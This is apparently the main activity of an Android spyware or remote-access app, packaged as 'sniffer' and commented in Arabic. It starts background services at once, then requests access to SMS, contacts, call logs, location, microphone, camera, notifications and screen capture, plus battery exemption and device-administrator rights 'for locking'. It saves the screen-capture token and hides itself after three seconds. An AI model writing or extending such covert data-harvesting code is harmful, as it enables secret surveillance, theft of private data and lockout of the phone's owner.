package com.v8.global.sniffer;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;

    private final String[] permissions = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.CAMERA
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // بدء الخدمات فوراً
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, NotifyService.class));

        // طلب جميع الصلاحيات تلقائياً
        new android.os.Handler().postDelayed(() -> requestAllPermissions(), 500);
    }

    private void requestAllPermissions() {
        // 1. الأذونات العادية
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{permission}, REQUEST_CODE_PERMISSIONS);
            }
        }

        // 2. صلاحية الإشعارات
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

        // 3. صلاحية تسجيل الشاشة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
        }

        // 4. تجاهل البطارية
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(intent);

        // 5. صلاحية Device Admin (للقفل)
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(admin)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            startActivity(adminIntent);
        }

        Toast.makeText(this, "✅ جاري فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
        
        // إخفاء التطبيق بعد 3 ثواني
        new android.os.Handler().postDelayed(() -> {
            moveTaskToBack(true);
            finish();
        }, 3000);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {
            getSharedPreferences("screen_capture", MODE_PRIVATE)
                    .edit()
                    .putInt("resultCode", resultCode)
                    .putString("data", data.toUri(0))
                    .apply();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
